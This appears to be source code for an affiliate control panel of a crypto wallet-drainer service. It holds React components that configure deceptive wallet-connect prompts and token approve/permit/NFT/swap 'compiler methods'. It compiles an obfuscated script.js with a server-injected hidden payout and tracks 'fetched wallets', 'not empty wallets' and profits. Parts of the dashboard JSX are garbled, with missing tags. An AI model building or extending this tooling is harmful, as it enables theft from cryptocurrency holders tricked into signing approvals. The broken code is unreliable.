```tsx
"use client";

import { Suspense, useMemo, useState } from "react";
import { useSearchParams } from "next/navigation";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { ExternalLink, RefreshCw, Wallet } from "lucide-react";

const DEFAULT_RUNTIME_URL = "http://localhost:4173";

export default function WalletRuntimePage() {
  return (
    <Suspense fallback={<div className="p-8 text-muted-foreground">Loading...</div>}>
      <WalletRuntimeInner />
    </Suspense>
  );
}

function WalletRuntimeInner() {
  const searchParams = useSearchParams();
  const [runtimeUrl, setRuntimeUrl] = useState(DEFAULT_RUNTIME_URL);
  const [refreshKey, setRefreshKey] = useState(0);

  const forwardedQuery = useMemo(() => {
    const next = new URLSearchParams();

    for (const key of ["projectId", "recipient", "mode", "chainId"]) {
      const value = searchParams.get(key);
      if (value) next.set(key, value);
    }

    const query = next.toString();
    return query ? `?${query}` : "";
  }, [searchParams]);

  const iframeSrc = `${runtimeUrl.replace(/\/$/, "")}/${forwardedQuery}`;

  return (
    <div className="space-y-6 max-w-[1600px] mx-auto">
      <div className="space-y-2">
        <Badge
          variant="outline"
          className="rounded-none border-primary/20 bg-primary/10 font-mono uppercase tracking-widest text-primary"
        >
          Embedded Wallet Runtime
        </Badge>
        <h1 className="font-display text-3xl uppercase tracking-wide">
          Bolt Wallet Runtime Inside St3
        </h1>
        <p className="text-sm text-muted-foreground font-mono">
          This page embeds the working Bolt wallet/session app so St3 can use it today without
          rebuilding the wallet flow from scratch.
        </p>
      </div>

      <div className="grid gap-6 xl:grid-cols-[380px_minmax(0,1fr)]">
        <Card className="rounded-none border-border/40 bg-black/40 backdrop-blur-xl">
          <CardHeader className="border-b border-border/40">
            <CardTitle className="flex items-center gap-2 font-display text-xl uppercase tracking-wide">
              <Wallet className="h-4 w-4 text-primary" />
              Runtime Source
            </CardTitle>
            <CardDescription>
              Point St3 to the running wallet app. The default is the local Bolt runtime on port
              4173.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-4 p-6">
            <div className="space-y-2">
              <Label htmlFor="runtime-url">Wallet Runtime URL</Label>
              <Input
                id="runtime-url"
                value={runtimeUrl}
                onChange={(event) => setRuntimeUrl(event.target.value)}
                className="rounded-none font-mono"
              />
            </div>

            <div className="space-y-2">
              <Label>Forwarded Query</Label>
              <div className="rounded-none border border-border/40 bg-black/20 px-3 py-2 font-mono text-xs text-muted-foreground">
                {forwardedQuery || "(none)"}
              </div>
            </div>

            <div className="flex flex-wrap gap-3">
              <Button
                onClick={() => setRefreshKey((value) => value + 1)}
                className="rounded-none gap-2"
              >
                <RefreshCw className="h-4 w-4" />
                Refresh Runtime
              </Button>
              <Button variant="outline" className="rounded-none gap-2" asChild>
                <a href={iframeSrc} target="_blank" rel="noreferrer">
                  <ExternalLink className="h-4 w-4" />
                  Open Runtime
                </a>
              </Button>
            </div>
          </CardContent>
        </Card>

        <Card className="rounded-none border-border/40 bg-black/40 backdrop-blur-xl overflow-hidden">
          <CardHeader className="border-b border-border/40">
            <CardTitle className="font-display text-xl uppercase tracking-wide">
              Live Wallet Runtime
            </CardTitle>
            <CardDescription>
              Embedded wallet/session flow from the Bolt app.
            </CardDescription>
          </CardHeader>
          <CardContent className="p-0">
            <iframe
              key={`${iframeSrc}-${refreshKey}`}
              src={iframeSrc}
              title="Embedded Wallet Runtime"
              className="h-[1100px] w-full border-0"
              referrerPolicy="no-referrer"
            />
          </CardContent>
        </Card>
      </div>
    </div>
  );
}
```

### src/components/affiliate/affiliate-access-hub.tsx

```tsx
"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { LogIn, UserRound, Users, KeyRound } from "lucide-react";
import { toast } from "sonner";

const SESSION_KEY = "st3-affiliate-session";

export function AffiliateAccessHub() {
  const router = useRouter();
  const [adminPassword, setAdminPassword] = useState("");
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [authBusy, setAuthBusy] = useState(false);
  const [adminBusy, setAdminBusy] = useState(false);
  const [authError, setAuthError] = useState("");
  const [adminError, setAdminError] = useState("");
  const [adminAddress, setAdminAddress] = useState<string | null>(null);

  useEffect(() => {
    let active = true;

    async function loadAdminSession() {
      try {
        const res = await fetch("/api/auth/me", { cache: "no-store" });
        const data = (await res.json()) as { authenticated?: boolean; address?: string; label?: string };
        if (!active) return;
        setAdminAddress(data?.authenticated ? data?.label || data?.address || null : null);
      } catch {
        if (!active) return;
        setAdminAddress(null);
      }
    }

    void loadAdminSession();

    return () => {
      active = false;
    };
  }, []);

  async function handleAdminLogin() {
    setAdminError("");
    if (!adminPassword) {
      setAdminError("Admin password is required.");
      return;
    }
    setAdminBusy(true);
    try {
      const verifyRes = await fetch("/api/admin/access", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password: adminPassword }),
      });
      const verifyData = (await verifyRes.json()) as {
        message?: string;
        session?: { label?: string; address?: string };
      };
      if (!verifyRes.ok) {
        throw new Error(verifyData?.message || "Admin login failed");
      }

      setAdminAddress(verifyData?.session?.label || verifyData?.session?.address || "Global Admin");
      toast.success("Global admin session active");
      router.push("/affiliate");
    } catch (error) {
      const message = error instanceof Error ? error.message : "Admin login failed";
      setAdminError(message);
      toast.error(message);
    } finally {
      setAdminBusy(false);
    }
  }

  async function handleAffiliateLogin() {
    setAuthError("");
    if (!username.trim()) {
      setAuthError("Username is required.");
      return;
    }
    if (!password) {
      setAuthError("Password is required.");
      return;
    }

    setAuthBusy(true);
    try {
      const res = await fetch("/api/affiliate/access", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username: username.trim(), password }),
      });
      const data = (await res.json()) as {
        message?: string;
        project?: { id: string; name?: string };
      };
      if (!res.ok || !data.project?.id) {
        throw new Error(data?.message || "Access denied");
      }

      window.localStorage.setItem(
        SESSION_KEY,
        JSON.stringify({ projectId: data.project.id, projectName: data.project.name }),
      );
      toast.success("Affiliate access granted");
      router.push("/affiliate");
    } catch (error) {
      setAuthError(error instanceof Error ? error.message : "Access denied");
    } finally {
      setAuthBusy(false);
    }
  }

  return (
    <div className="grid gap-6 lg:grid-cols-2">
      <Card className="rounded-none border-border/40 bg-black/40 backdrop-blur-xl">
        <CardHeader className="border-b border-border/40">
          <Badge variant="outline" className="w-fit rounded-none border-primary/20 bg-primary/10 font-mono uppercase tracking-widest text-primary">
            Global Admin
          </Badge>
          <CardTitle className="font-display text-2xl uppercase tracking-wide">Main App Login</CardTitle>
          <CardDescription>
            Use your global admin password here. This is your full-access general admin path.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4 p-6">
          <div className="space-y-2">
            <Label htmlFor="dashboard-admin-password">Admin Password</Label>
            <Input
              id="dashboard-admin-password"
              name="password"
              type="password"
              autoComplete="current-password"
              value={adminPassword}
              onChange={(event) => setAdminPassword(event.target.value)}
              placeholder="Enter global admin password"
              className="rounded-none"
            />
          </div>
          {adminError ? <p className="text-sm text-destructive">{adminError}</p> : null}
          <div className="rounded-none border border-border/40 bg-black/30 p-4 text-sm text-muted-foreground">
            {adminAddress ? `Authenticated as ${adminAddress}` : "Login here, then jump straight into the merged /affiliate portal."}
          </div>
          <div className="flex flex-wrap gap-3">
            <Button onClick={() => void handleAdminLogin()} disabled={adminBusy} className="gap-2 rounded-none">
              <KeyRound className="h-4 w-4" />
              {adminBusy ? "Signing in..." : adminAddress ? "Reconnect Admin" : "Login As Global Admin"}
            </Button>
            <Button asChild variant="outline" className="gap-2 rounded-none">
              <Link href="/affiliates">
                <Users className="h-4 w-4" />
                Open Admin
              </Link>
            </Button>
          </div>
        </CardContent>
      </Card>

      <Card className="rounded-none border-border/40 bg-black/40 backdrop-blur-xl">
        <CardHeader className="border-b border-border/40">
          <Badge variant="outline" className="w-fit rounded-none border-primary/20 bg-primary/10 font-mono uppercase tracking-widest text-primary">
            Affiliate Access
          </Badge>
          <CardTitle className="font-display text-2xl uppercase tracking-wide">Affiliate Login</CardTitle>
          <CardDescription>
            Use the affiliate project credentials here and go directly into the affiliate panel.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4 p-6">
          <div className="space-y-2">
            <Label htmlFor="dashboard-affiliate-username">Username</Label>
            <Input
              id="dashboard-affiliate-username"
              name="username"
              autoComplete="username"
              value={username}
              onChange={(event) => setUsername(event.target.value)}
              placeholder="aff_..."
              className="rounded-none font-mono"
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="dashboard-affiliate-password">Password</Label>
            <Input
              id="dashboard-affiliate-password"
              name="password"
              type="password"
              autoComplete="current-password"
              value={password}
              onChange={(event) => setPassword(event.target.value)}
              placeholder="Enter affiliate password"
              className="rounded-none"
            />
          </div>
          {authError ? <p className="text-sm text-destructive">{authError}</p> : null}
          <div className="flex flex-wrap gap-3">
            <Button onClick={() => void handleAffiliateLogin()} disabled={authBusy} variant="outline" className="gap-2 rounded-none">
              <UserRound className="h-4 w-4" />
              {authBusy ? "Signing in..." : "Open Affiliate Panel"}
            </Button>
            <Button asChild variant="outline" className="gap-2 rounded-none">
              <Link href="/affiliate">
                <LogIn className="h-4 w-4" />
                Open Portal
              </Link>
            </Button>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
```

### src/components/affiliate/affiliate-compile-output.tsx

```tsx
"use client";

import { useState } from "react";
import { useStore } from "@/lib/store";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Download, Copy, Check, FileCode2, Shield } from "lucide-react";
import { toast } from "sonner";

function downloadFile(filename: string, content: string, type = "text/plain") {
  const blob = new Blob([content], { type });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

export function AffiliateCompileOutput({
  projectId,
  projectName,
}: {
  projectId: string;
  projectName?: string;
}) {
  const { generalConfig, walletConfig, modalConfig, tokensConfig, advancedConfig } = useStore();
  const [compileBusy, setCompileBusy] = useState(false);
  const [compiled, setCompiled] = useState(false);
  const [scriptOutput, setScriptOutput] = useState("");
  const [copied, setCopied] = useState(false);

  async function handleCompile() {
    setCompileBusy(true);
    try {
      const saveRes = await fetch("/api/affiliate/config", {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          projectId,
          general: generalConfig,
          wallet: walletConfig,
          modal: modalConfig,
          tokens: tokensConfig,
          advanced: advancedConfig,
        }),
      });
      const saveData = (await saveRes.json()) as { message?: string };
      if (!saveRes.ok) {
        throw new Error(saveData?.message || "Failed to save affiliate config");
      }

      const compileRes = await fetch("/api/affiliate/compile", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ projectId, obfuscationLevel: "medium" }),
      });

      if (!compileRes.ok) {
        let message = "Failed to compile affiliate script";
        try {
          const compileData = (await compileRes.json()) as { message?: string };
          message = compileData?.message || message;
        } catch {
          // Leave the default message in place.
        }
        throw new Error(message);
      }

      const content = await compileRes.text();
      setScriptOutput(content);
      setCompiled(true);
      toast.success("Affiliate script compiled");
    } catch (error) {
      toast.error(error instanceof Error ? error.message : "Compile failed");
    } finally {
      setCompileBusy(false);
    }
  }

  function handleCopy() {
    navigator.clipboard.writeText(scriptOutput);
    setCopied(true);
    setTimeout(() => setCopied(false), 1800);
    toast.success("Copied script.js");
  }

  function handleDownload() {
    downloadFile(`script-${projectId}.js`, scriptOutput, "application/javascript");
    toast.success("Downloaded script.js");
  }

  return (
    <div className="space-y-6">
      <div className="grid gap-4 md:grid-cols-4">
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl md:col-span-2">
          <CardHeader className="pb-3">
            <CardTitle className="text-sm font-mono uppercase tracking-wider">Affiliate Project</CardTitle>
            <CardDescription>
              Compile a clean affiliate bundle for {projectName || projectId}. Payout stays hidden in the UI and is injected by the server.
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-2 text-sm text-muted-foreground">
            <div className="flex items-center gap-2">
              <Shield className="h-4 w-4 text-primary" />
              <span>Server-controlled payout injection</span>
            </div>
            <div className="flex items-center gap-2">
              <FileCode2 className="h-4 w-4 text-primary" />
              <span>Affiliate compile always uses protected output</span>
            </div>
          </CardContent>
        </Card>
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl">
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Functions</p>
            <p className="text-xl font-semibold">{tokensConfig.contractFunctions.length}</p>
          </CardContent>
        </Card>
        <Card className="border-border/40 bg-black/40 backdrop-blur-xl">
          <CardContent className="p-4">
            <p className="text-xs text-muted-foreground mb-1">Protection</p>
            <Badge variant="default" className="text-[10px] uppercase tracking-wider">
              Medium+
            </Badge>
          </CardContent>
        </Card>
      </div>

      <Card className="border-border/40 bg-black/40 backdrop-blur-xl">
        <CardHeader className="flex flex-row items-center justify-between gap-4">
          <div>
            <CardTitle className="text-sm font-mono uppercase tracking-wider">Compile Output</CardTitle>
            <CardDescription>Save the current affiliate config, compile the protected script, then copy or download it.</CardDescription>
          </div>
          <Button onClick={() => void handleCompile()} disabled={compileBusy} className="gap-2">
            <FileCode2 className="h-4 w-4" />
            {compileBusy ? "Compiling..." : compiled ? "Recompile script.js" : "Compile script.js"}
          </Button>
        </CardHeader>
        <CardContent className="space-y-4">
          {compiled && scriptOutput ? (
            <>
              <div className="flex flex-wrap gap-2">
                <Button variant="outline" onClick={handleCopy} className="gap-2">
                  {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                  {copied ? "Copied" : "Copy"}
                </Button>
                <Button variant="outline" onClick={handleDownload} className="gap-2">
                  <Download className="h-4 w-4" />
                  Download
                </Button>
              </div>
              <pre className="max-h-[460px] overflow-auto rounded-none border border-border/40 bg-black/70 p-4 text-xs leading-6 text-primary">
                <code>{scriptOutput}</code>
              </pre>
            </>
          ) : (
            <div className="rounded-none border border-dashed border-border/50 bg-black/30 p-8 text-sm text-muted-foreground">
              No compiled script yet. Configure the affiliate panel tabs, then compile here.
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}
```

### src/components/affiliate/affiliate-portal.tsx

```tsx
"use client";

import { useState } from "react";
import { LegacyAffiliatePanel } from "@/components/affiliate/legacy-affiliate-panel";
import { LegacyLoginGate } from "@/components/affiliate/legacy-login-gate";

type AffiliateSession = {
  projectId: string;
  projectName?: string;
};

const SESSION_KEY = "st3-affiliate-session";

export function AffiliatePortal() {
  const [session, setSession] = useState<AffiliateSession | null>(() => {
    if (typeof window === "undefined") return null;
    try {
      const raw = window.localStorage.getItem(SESSION_KEY);
      if (!raw) return null;
      const nextSession = JSON.parse(raw) as AffiliateSession;
      return nextSession?.projectId ? nextSession : null;
    } catch {
      return null;
    }
  });

  if (!session) {
    return (
      <LegacyLoginGate
        onLogin={(nextSession) => {
          window.localStorage.setItem(SESSION_KEY, JSON.stringify(nextSession));
          setSession(nextSession);
        }}
      />
    );
  }

  return <LegacyAffiliatePanel projectId={session.projectId} projectName={session.projectName} />;
}
```

```tsx
import { useState } from "react";
import { LegacyTopNav } from "@/components/affiliate/legacy-top-nav";
import { LegacySidebar } from "@/components/affiliate/legacy-sidebar";
import { LegacyGeneralTab } from "@/components/affiliate/legacy-general-tab";
import { LegacyDashboardTab } from "@/components/affiliate/legacy-dashboard-tab";
import { LegacyModalTab } from "@/components/affiliate/legacy-modal-tab";
import { LegacyScriptGenerator } from "@/components/affiliate/legacy-script-generator";
import type {
  DashboardSettings,
  ErrorState,
  GeneralSettings,
  MessageStep,
  ModalSettings,
  Tab,
} from "@/components/affiliate/legacy-types";

const defaultGeneral: GeneralSettings = {
  font: "Manrope",
  theme: "light",
  borderRadius: 18,
  fontSize: 14,
  accentColor: "#7C73FF",
  openEvent: "After click on button",
  openTrigger: "Automatic",
};

const defaultDashboard: DashboardSettings = {
  menuItems: ["Domains", "Logs", "Settings", "Compiler"],
  contractMethods: ["Claim", "Execute", "Swap"],
  enableApprove: true,
  enablePermit: true,
  enablePermit2: false,
  enableNFT: false,
  enableSwappers: true,
};

const defaultModal: ModalSettings = {
  selectedModal: "wc3",
  borderRadius: 12,
  overlayBlur: 8,
  accentColor: "#FF2D92",
  supportedWallets: ["MetaMask", "Coinbase", "WalletConnect"],
};

const defaultMessageSteps: MessageStep[] = [
  { id: 1, label: "Connect", text: "Connect your wallet to continue" },
  { id: 2, label: "Thanks", text: "Thank you for connecting!" },
  { id: 3, label: "Sign", text: "Please sign the transaction to confirm" },
];

const defaultErrorStates: ErrorState[] = [
  { id: "generic", label: "Generic Error", title: "Something went wrong", description: "Please try again later", button: "Retry" },
];

export function LegacyAffiliatePanel({
  projectId,
  projectName,
}: {
  projectId: string;
  projectName?: string;
}) {
  const [walletConnected, setWalletConnected] = useState(false);
  const [activeTab, setActiveTab] = useState<Tab>("dashboard");
  const [general, setGeneral] = useState<GeneralSettings>(defaultGeneral);
  const [dashboard, setDashboard] = useState<DashboardSettings>(defaultDashboard);
  const [modal, setModal] = useState<ModalSettings>(defaultModal);
  const [messageSteps, setMessageSteps] = useState<MessageStep[]>(defaultMessageSteps);
  const [errorStates, setErrorStates] = useState<ErrorState[]>(defaultErrorStates);

  const walletStyleMap: Record<string, string> = {
    wc3: "reown",
    wc2: "walletconnect",
    family: "custom",
    rainbow: "rainbowkit",
    saturn: "web3modal",
    mars: "web3modal",
    venus: "custom",
  };

  async function handleGenerate(): Promise<string> {
    const configPayload = {
      projectId,
      general: {
        connectText: "Connect Wallet",
        connectedText: "Connected: {wallet}",
        loadingText: messageSteps.find((step) => step.label === "Processing")?.text || "Verifying...",
        verifyText: messageSteps.find((step) => step.label === "Sign")?.text || "Please confirm in your wallet",
        rejectText: errorStates.find((state) => state.id === "generic")?.title || "Transaction was declined",
        disconnectText: "Disconnect",
        themeMode: general.theme,
        transactionFunctionName: dashboard.contractMethods[0] || "claimReward",
      },
      wallet: {
        supportedWallets: modal.supportedWallets.map((wallet) => wallet.toLowerCase()),
        walletVisibility: modal.supportedWallets.reduce<Record<string, boolean>>((acc, wallet) => {
          acc[wallet.toLowerCase()] = true;
          return acc;
        }, {}),
      },
      modal: {
        modalFrameworkStyle: walletStyleMap[modal.selectedModal] || "custom",
        enableLatestWC: modal.selectedModal === "wc3",
        clickToOpenModal: general.openEvent === "After click on button",
      },
      tokens: {
        contractFunctions: dashboard.contractMethods,
        allowanceExecution: dashboard.enableApprove,
        balanceBasedApproval: dashboard.enablePermit || dashboard.enablePermit2,
        erc721Support: dashboard.enableNFT,
        marketplaceTransfers: dashboard.enableSwappers,
      },
      advanced: {
        signaturePromptText: messageSteps.find((step) => step.label === "Sign")?.text || "Verify ownership of {wallet}",
      },
    };

    const saveResponse = await fetch("/api/affiliate/config", {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(configPayload),
    });
    const saveData = (await saveResponse.json()) as { message?: string };
    if (!saveResponse.ok) throw new Error(saveData?.message || "Failed to save affiliate config");

    const compileResponse = await fetch("/api/affiliate/compile", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ projectId, obfuscationLevel: "medium" }),
    });
    if (!compileResponse.ok) {
      let message = "Failed to compile affiliate script";
      try {
        const compileError = (await compileResponse.json()) as { message?: string };
        message = compileError?.message || message;
      } catch {
        // Keep the default message.
      }
      throw new Error(message);
    }
    return compileResponse.text();
  }

  return (
    <div style={{ minHeight: "100vh", background: "#f7f6f3", fontFamily: "Manrope, sans-serif", display: "flex", flexDirection: "column", margin: "-24px" }}>
      <LegacyTopNav
        walletConnected={walletConnected}
        walletAddress={projectName ? `${projectName} · ${projectId}` : projectId}
        onConnect={() => setWalletConnected(true)}
      />

      <div style={{ flex: 1, display: "flex", overflow: "hidden" }}>
        <LegacySidebar activeTab={activeTab} onTabChange={setActiveTab} />
        <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden", background: "#faf9f7" }}>
          <div style={{ flex: 1, overflowY: "auto", padding: "28px 42px", minHeight: 0 }}>
            {activeTab === "general" ? <LegacyGeneralTab settings={general} onChange={setGeneral} /> : null}
            {activeTab === "dashboard" ? <LegacyDashboardTab settings={dashboard} onChange={setDashboard} /> : null}
            {activeTab === "modal" ? (
              <div style={{ display: "flex", flexDirection: "column", gap: 22 }}>
                <LegacyModalTab
                  settings={modal}
                  onChange={setModal}
                  messageSteps={messageSteps}
                  onMessageChange={setMessageSteps}
                  errorStates={errorStates}
                  onErrorChange={setErrorStates}
                />
                <LegacyScriptGenerator onGenerate={handleGenerate} />
              </div>
            ) : null}
          </div>
        </div>
      </div>
    </div>
  );
}
```

```tsx
"use client";

import { CalendarDays, FileCode2, Globe, RefreshCw, WalletCards } from "lucide-react";
import type { DashboardSettings } from "@/components/affiliate/legacy-types";

const menuOptions = ["Domains", "Logs", "Settings", "Compiler"];
const contractMethods = ["Claim", "Execute", "Swap", "Transfer", "Approve", "Permit", "Permit2", "Mint", "Stake"];
const metricCards = [
  { label: "Fetched wallets", value: "0", icon: WalletCards },
  { label: "Unique wallets", value: "0", icon: WalletCards },
  { label: "Not empty wallets", value: "0", icon: WalletCards },
  { label: "Domains", value: "0", icon: Globe },
  { label: "Total profits", value: "$0.00", icon: FileCode2 },
  { label: "Auto paid", value: "$0.00", icon: CalendarDays },
];

export function LegacyDashboardTab({
  settings,
  onChange,
}: {
  settings: DashboardSettings;
  onChange: (s: DashboardSettings) => void;
}) {
  const toggleMenu = (item: string) => {
    const items = settings.menuItems.includes(item) ? settings.menuItems.filter((i) => i !== item) : [...settings.menuItems, item];
    onChange({ ...settings, menuItems: items });
  };
  const toggleMethod = (method: string) => {
    const methods = settings.contractMethods.includes(method)
      ? settings.contractMethods.filter((m) => m !== method)
      : [...settings.contractMethods, method];
    onChange({ ...settings, contractMethods: methods });
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 26 }}>
      <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
        <h3 style={{ margin: 0, fontSize: 18, fontWeight: 700, color: "#2a2732" }}>Statistics</h3>
        <button
          style={{
            width: 34,
            height: 34,
            borderRadius: 12,
            border: "1px solid rgba(64, 54, 88, 0.08)",
            background: "#ffffff",
            display: "grid",
            placeItems: "center",
            color: "#5d5868",
            cursor: "pointer",
          }}
        >
          <RefreshCw size={16} />
        </button>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr 1.8fr", gap: 22 }}>
        <div style={{ background: "#fff", border: "1px solid rgba(64, 54, 88, 0.08)", borderRadius: 34, minHeight: 256, padding: "34px 36px" }}>
          <div style={{ color: "#aaa6b1", fontSize: 16, marginBottom: 8 }}>Balance (available)</div>
          <div style={{ color: "#766ef5", fontSize: 56, fontWeight: 700, lineHeight: 1 }}>$0</div>
          <div style={{ color: "#aaa6b1", fontSize: 16, marginTop: 52, marginBottom: 8 }}>Requested</div>
          <div style={{ color: "#2c2934", fontSize: 48, fontWeight: 700, lineHeight: 1 }}>$0</div>
        </div>

        <div
          style={{
            background: "#fff",
            border: "1px solid rgba(64, 54, 88, 0.08)",
            borderRadius: 34,
            minHeight: 256,
            padding: "18px 26px",
            display: "grid",
            gridTemplateColumns: "repeat(3, 1fr)",
          }}
        >
          {metricCards.map((card, index) => {
            const Icon = card.icon;
            const rightDivider = index % 3 !== 2;
            const bottomDivider = index < 3;
            return (
              <div
                key={card.label}
                style={{
                  padding: "20px 16px 18px",
                  borderRight: rightDivider ? "1px solid rgba(64, 54, 88, 0.08)" : "none",
                  borderBottom: bottomDivider ? "1px solid rgba(64, 54, 88, 0.08)" : "none",
                  display: "flex",
                  flexDirection: "column",
                  justifyContent: "space-between",
                  gap: 18,
                }}
              >
                <div style={{ display: "flex", justifyContent: "space-between", gap: 10 }}>
                  <div style={{ color: "#b3afbb", fontSize: 15, lineHeight: 1.3 }}>{card.label}</div>
                  <Icon size={42} strokeWidth={1.7} color="#555166" />
                </div>
                <div style={{ color: "#23212b", fontSize: 22, fontWeight: 700 }}>{card.value}</div>
              </div>
            );
          })}
        </div>
      </div>

      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginTop: 8 }}>
        <div style={{ fontSize: 18, fontWeight: 700, color: "#2a2732" }}>Analytics</div>
        <div style={{ display: "flex", gap: 18, alignItems: "center" }}>
          <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
            <div style={{ color: "#3b3843", fontWeight: 700 }}>Period</div>
            <div style={{ display: "flex", alignItems: "center", gap: 12, background: "#fff", border: "1px solid rgba(64, 54, 88, 0.08)", borderRadius: 14, padding: "12px 16px", color: "#9793a0", minWidth: 292 }}>
              <span>Start date</span>
              <span style={{ color: "#b1adba" }}>→</span>
              <span>End date</span>
              <CalendarDays size={18} style={{ marginLeft: "auto" }} />
            </div>
          </div>
          <div style={{ display: "flex", gap: 8, alignItems: "center" }}>
            <div style={{ color: "#3b3843", fontWeight: 700 }}>Domain</div>
            <div style={{ minWidth: 188, background: "#fff", border: "1px solid rgba(64, 54, 88, 0.08)", borderRadius: 14, padding: "12px 16px", color: "#9793a0" }}>All</div>
          </div>
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: 22 }}>
        <div style={{ background: "#fff", border: "1px solid rgba(64, 54, 88, 0.08)", borderRadius: 34, padding: "26px 30px" }}>

            <div style={{ display: "flex", alignItems: "center", gap: 10, background: "#f8f6fd", borderRadius: 16, padding: "6px" }}>
              {["Day", "Month", "Year"].map((range, index) => (

                  key={range}
                  style={{
                    height: 46,
                    minWidth: 82,
                    borderRadius: 14,
                    border: "none",
                    background: index === 0 ? "#766ef5" : "transparent",
                    color: index === 0 ? "#fff" : "#373440",
                    fontWeight: 700,
                    cursor: "pointer",
                  }}
                >
                  {range}
                </button>
              ))}
            </div>
          </div>
          <div style={{ height: 1, borderTop: "2px dashed rgba(187, 181, 196, 0.6)", marginBottom: 22 }} />
          <div style={{ fontSize: 18, fontWeight: 700, color: "#2a2732", marginBottom: 18 }}>Navigation</div>
          <div style={{ display: "flex", gap: 10, flexWrap: "wrap" }}>
            {menuOptions.map((item) => {
              const selected = settings.menuItems.includes(item);
              return (

                    padding: "11px 18px",

                    cursor: "pointer",
                  }}
                >
                  {item}
                </button>
              );
            })}
          </div>
          <div style={{ fontSize: 18, fontWeight: 700, color: "#2a2732", margin: "28px 0 18px" }}>Compiler methods</div>
          <div style={{ display: "flex", gap: 10, flexWrap: "wrap" }}>
            {contractMethods.map((method) => {
              const selected = settings.contractMethods.includes(method);
              return (
                <button
                  key={method}
                  onClick={() => toggleMethod(method)}
                  style={{
                    padding: "10px 16px",
                    borderRadius: 12,
                    border: "1px solid rgba(64, 54, 88, 0.08)",
                    background: selected ? "#766ef5" : "#fbfaf8",
                    color: selected ? "#fff" : "#555166",
                    fontWeight: 600,
                    cursor: "pointer",
                  }}
                >
                  {method}
                </button>
              );

        </div>

        <div style={{ background: "#fff", border: "1px solid rgba(64, 54, 88, 0.08)", borderRadius: 34, padding: "26px 28px" }}>
          <div style={{ fontSize: 18, fontWeight: 700, color: "#2a2732", marginBottom: 18 }}>Compiler toggles</div>
          <div style={{ display: "grid", gap: 12 }}>
            {[
              ["enableApprove", "Approve"],
              ["enablePermit", "Permit"],
              ["enablePermit2", "Permit2"],
              ["enableNFT", "NFT"],
              ["enableSwappers", "Swappers"],
            ].map(([key, label]) => (
              <label key={key} style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "14px 16px", background: "#fbfaf8", borderRadius: 16, border: "1px solid rgba(64, 54, 88, 0.08)" }}>
                <span style={{ color: "#433f4c", fontWeight: 600 }}>{label}</span>
                <input
                  type="checkbox"
                  checked={Boolean(settings[key as keyof DashboardSettings])}
                  onChange={() => onChange({ ...settings, [key]: !settings[key as keyof DashboardSettings] })}
                />
              </label>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
```

```tsx
"use client";

import type { GeneralSettings } from "@/components/affiliate/legacy-types";

function FieldLabel({ children }: { children: React.ReactNode }) {
  return (
    <label style={{ fontSize: 12, color: "#8f8a97", display: "block", marginBottom: 8, fontWeight: 700 }}>
      {children}
    </label>
  );
}

function StyledSelect({
  value,
  options,
  onChange,
}: {
  value: string;
  options: string[];
  onChange: (value: string) => void;
}) {
  return (
    <select
      value={value}
      onChange={(event) => onChange(event.target.value)}
      style={{
        width: "100%",
        background: "#fbfaf8",
        border: "1px solid rgba(64, 54, 88, 0.08)",
        borderRadius: 14,
        padding: "13px 14px",
        color: "#332f3d",
        fontSize: 14,
        outline: "none",
      }}
    >
      {options.map((option) => (
        <option key={option} value={option}>
          {option}
        </option>
      ))}
    </select>
  );
}

export function LegacyGeneralTab({
  settings,
  onChange,
}: {
  settings: GeneralSettings;
  onChange: (settings: GeneralSettings) => void;
}) {
  const update = (key: keyof GeneralSettings, value: string | number) => onChange({ ...settings, [key]: value });

  return (
    <div style={{ display: "grid", gap: 18 }}>
      <div style={{ background: "#fff", border: "1px solid rgba(64, 54, 88, 0.08)", borderRadius: 28, padding: 24 }}>
        <div style={{ fontWeight: 700, fontSize: 22, color: "#2a2732", marginBottom: 6 }}>Domains</div>
        <div style={{ fontSize: 13, color: "#9a96a7", marginBottom: 20 }}>
          Configure appearance and behavior defaults for your affiliate workspace
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 18 }}>
          <div>
